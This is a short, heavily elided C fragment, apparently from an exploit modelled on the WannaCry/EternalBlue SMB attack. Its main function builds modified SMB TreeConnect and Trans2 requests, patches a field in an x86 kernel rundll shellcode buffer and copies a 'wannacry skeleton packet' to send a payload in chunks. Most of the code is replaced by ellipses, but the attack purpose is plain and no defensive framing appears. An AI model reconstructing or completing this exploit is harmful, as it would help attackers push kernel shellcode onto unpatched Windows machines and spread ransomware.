...
int main(int argc, char* argv[])
{
	...
	*/
	...
	//send SMB modified TreeConnect request
	...
	//Update treeID, UserID in trans2 request
	...
	*(DWORD*)&x86_kernel_rundll_shellcode[4865] = 1;
	...
	for (ctx = 0; ctx < payload_totalsize;)
	{
		...
		if (bytesLeft < 4096)
		{
			...
			//copy wannacry skeleton packet to big SMB Trans2 packet
			memcpy((unsigned char*)last_packet, (unsigned char*)wannacry_Trans2_Request, 70);

			//update NetBIOS size in the SMB packet
		...
		//Update treeID, UserID in the packet
